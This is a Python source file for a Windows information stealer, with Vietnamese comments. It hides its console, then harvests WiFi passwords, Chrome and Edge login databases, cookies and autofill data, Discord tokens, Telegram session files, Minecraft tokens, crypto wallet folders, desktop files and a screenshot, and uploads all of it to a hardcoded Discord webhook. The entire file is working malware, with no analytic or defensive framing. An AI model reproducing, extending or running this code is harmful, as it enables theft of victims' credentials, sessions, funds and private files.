import os
import json
import requests
import subprocess
import sqlite3
import shutil
import base64
import re
import sys
import ctypes
import time
import urllib.request
import zipfile
from datetime import datetime

# ==================== ẨN CONSOLE ====================
if getattr(sys, 'frozen', False):
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ==================== WEBHOOK ====================
WEBHOOK = "https://discord.com/api/webhooks/1487633660386742402/kpbrjzvaYLbaYiPJYEcAhpnpyul9wrXmpOS2fV4Mbq1xx9Yc73_Pmiq1A2bt0Djaetxt"

# ==================== GỬI DỮ LIỆU ====================
def send(msg):
    try:
        for i in range(0, len(msg), 1900):
            requests.post(WEBHOOK, json={"content": msg[i:i+1900]}, timeout=10)
    except:
        pass

def send_file(filepath, filename):
    try:
        with open(filepath, 'rb') as f:
            requests.post(WEBHOOK, files={"file": (filename, f)}, timeout=15)
        return True
    except:
        return False

# ==================== 1. THÔNG TIN HỆ THỐNG ====================
def get_system_info():
    hostname = os.getenv('COMPUTERNAME', 'Unknown')
    username = os.getenv('USERNAME', 'Unknown')
    try:
        ip = subprocess.check_output('curl -s ifconfig.me', shell=True).decode().strip()
    except:
        ip = "Unknown"
    return f"""💻 **SYSTEM INFO**
🖥️ PC: {hostname}
👤 User: {username}
🌐 IP: {ip}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""

# ==================== 2. MINECRAFT ====================
def get_minecraft():
    path = os.path.expandvars(r"%appdata%\.minecraft\launcher_accounts.json")
    if os.path.exists(path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            for uuid, acc in data.get('accounts', {}).items():
                return f"""🎮 **MINECRAFT**
Username: {acc.get('username', 'Unknown')}
Email: {acc.get('email', 'No email')}
Token: {acc.get('accessToken', 'No token')[:80]}..."""
        except:
            pass
    return None

# ==================== 3. WIFI ====================
def get_wifi():
    results = []
    try:
        profiles = subprocess.check_output('netsh wlan show profiles', shell=True, encoding='utf-8', stderr=subprocess.DEVNULL)
        for line in profiles.split('\n'):
            if ':' in line and 'All User Profile' in line:
                name = line.split(':')[1].strip()
                try:
                    data = subprocess.check_output(f'netsh wlan show profile "{name}" key=clear', shell=True, encoding='utf-8', stderr=subprocess.DEVNULL)
                    for p in data.split('\n'):
                        if 'Key Content' in p:
                            pwd = p.split(':')[1].strip()
                            results.append(f"📶 {name} → {pwd}")
                except:
                    pass
    except:
        pass
    return results

# ==================== 4. CHROME/EDGE PASSWORDS (ĐỌC RAW) ====================
def get_browser_db(browser_path, name):
    if os.path.exists(browser_path):
        temp = os.path.expandvars(r"%temp%\temp.db")
        try:
            shutil.copy2(browser_path, temp)
            conn = sqlite3.connect(temp)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value FROM logins")
            results = []
            for url, user in cursor.fetchall():
                if user and ('google' in url.lower() or 'roblox' in url.lower() or 'microsoft' in url.lower()):
                    results.append(f"🔗 {url}\n📧 {user}")
            conn.close()
            os.remove(temp)
            if results:
                send_file(browser_path, f"{name}_passwords.db")
                return f"📁 {name}: {len(results)} accounts (file sent)"
        except:
            pass
    return None

# ==================== 5. DISCORD TOKENS ====================
def get_discord_tokens():
    tokens = []
    paths = [
        os.path.expandvars(r"%appdata%\Discord\Local Storage\leveldb"),
        os.path.expandvars(r"%appdata%\discordcanary\Local Storage\leveldb"),
        os.path.expandvars(r"%appdata%\discordptb\Local Storage\leveldb")
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                for file in os.listdir(path):
                    if file.endswith('.log') or file.endswith('.ldb'):
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            content = f.read()
                            found = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                            tokens.extend(found)
            except:
                pass
    return list(set(tokens))

# ==================== 6. TELEGRAM SESSION ====================
def get_telegram():
    tdata = os.path.expandvars(r"%appdata%\Telegram Desktop\tdata")
    if os.path.exists(tdata):
        zip_path = os.path.expandvars(r"%temp%\telegram_tdata.zip")
        try:
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                for root, dirs, files in os.walk(tdata):
                    for file in files:
                        zipf.write(os.path.join(root, file), file)
            send_file(zip_path, "telegram_session.zip")
            os.remove(zip_path)
            return "📱 Telegram session files sent"
        except:
            pass
    return None

# ==================== 7. CRYPTO WALLETS ====================
def get_wallets():
    wallets = []
    paths = [
        os.path.expandvars(r"%appdata%\Bitcoin\wallets"),
        os.path.expandvars(r"%appdata%\Ethereum\keystore"),
        os.path.expandvars(r"%appdata%\Exodus\exodus.wallet"),
        os.path.expandvars(r"%appdata%\Electrum\wallets")
    ]
    for path in paths:
        if os.path.exists(path):
            wallets.append(path)
    return wallets

# ==================== 8. DESKTOP FILES ====================
def get_desktop_files():
    desktop = os.path.expandvars(r"%userprofile%\Desktop")
    files = []
    if os.path.exists(desktop):
        for f in os.listdir(desktop):
            if os.path.isfile(os.path.join(desktop, f)) and f.endswith(('.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.xlsx', '.zip')):
                files.append(f)
        if files:
            zip_path = os.path.expandvars(r"%temp%\desktop_files.zip")
            try:
                with zipfile.ZipFile(zip_path, 'w') as zipf:
                    for f in files[:20]:
                        zipf.write(os.path.join(desktop, f), f)
                send_file(zip_path, "desktop_files.zip")
                os.remove(zip_path)
                return f"📁 Desktop: {len(files)} files (zip sent)"
            except:
                pass
    return None

# ==================== 9. SCREENSHOT ====================
def take_screenshot():
    try:
        from PIL import ImageGrab
        screenshot = ImageGrab.grab()
        path = os.path.expandvars(r"%temp%\screenshot.png")
        screenshot.save(path)
        send_file(path, "screenshot.png")
        os.remove(path)
        return "📸 Screenshot captured"
    except:
        return None

# ==================== 10. INSTALLED PROGRAMS ====================
def get_installed_programs():
    programs = []
    try:
        data = subprocess.check_output('wmic product get name', shell=True, encoding='utf-8', stderr=subprocess.DEVNULL)
        for line in data.split('\n')[1:]:
            if line.strip():
                programs.append(line.strip())
    except:
        pass
    return programs[:30]

# ==================== 11. BROWSER COOKIES ====================
def get_cookies():
    cookie_path = os.path.expandvars(r"%localappdata%\Google\Chrome\User Data\Default\Cookies")
    if os.path.exists(cookie_path):
        send_file(cookie_path, "chrome_cookies.db")
        return "🍪 Chrome cookies sent"
    return None

# ==================== 12. AUTOFILL DATA ====================
def get_autofill():
    webdata = os.path.expandvars(r"%localappdata%\Google\Chrome\User Data\Default\Web Data")
    if os.path.exists(webdata):
        send_file(webdata, "chrome_autofill.db")
        return "📝 Chrome autofill sent"
    return None

# ==================== MAIN ====================
def main():
    send("🔍 **STARTING DATA COLLECTION...**")
    
    # Thu thập
    send(get_system_info())
    
    # Minecraft
    mc = get_minecraft()
    if mc:
        send(mc)
    
    # WiFi
    wifi = get_wifi()
    if wifi:
        send("📡 **WIFI PASSWORDS**\n" + "\n".join(wifi))
    
    # Chrome
    chrome = get_browser_db(os.path.expandvars(r"%localappdata%\Google\Chrome\User Data\Default\Login Data"), "Chrome")
    if chrome:
        send(chrome)
    
    # Edge
    edge = get_browser_db(os.path.expandvars(r"%localappdata%\Microsoft\Edge\User Data\Default\Login Data"), "Edge")
    if edge:
        send(edge)
    
    # Discord
    discord_tokens = get_discord_tokens()
    if discord_tokens:
        send("💬 **DISCORD TOKENS**\n" + "\n".join([f"`{t}`" for t in discord_tokens[:5]]))
    
    # Telegram
    tg = get_telegram()
    if tg:
        send(tg)
    
    # Crypto wallets
    wallets = get_wallets()
    if wallets:
        send(f"💰 **CRYPTO WALLETS FOUND**\n" + "\n".join(wallets))
        for w in wallets:
            if os.path.isdir(w):
                zip_path = os.path.expandvars(r"%temp%\wallet.zip")
                try:
                    with zipfile.ZipFile(zip_path, 'w') as zipf:
                        for root, dirs, files in os.walk(w):
                            for file in files:
                                zipf.write(os.path.join(root, file), file)
                    send_file(zip_path, "crypto_wallet.zip")
                    os.remove(zip_path)
                except:
                    pass
    
    # Desktop files
    desktop = get_desktop_files()
    if desktop:
        send(desktop)
    
    # Screenshot
    ss = take_screenshot()
    if ss:
        send(ss)
    
    # Cookies
    cookies = get_cookies()
    if cookies:
        send(cookies)
    
    # Autofill
    autofill = get_autofill()
    if autofill:
        send(autofill)
    
    # Installed programs
    programs = get_installed_programs()
    if programs:
        send("📦 **INSTALLED PROGRAMS**\n" + "\n".join(programs[:20]))
    
    send("✅ **COLLECTION COMPLETE!**")

if __name__ == "__main__":
    main()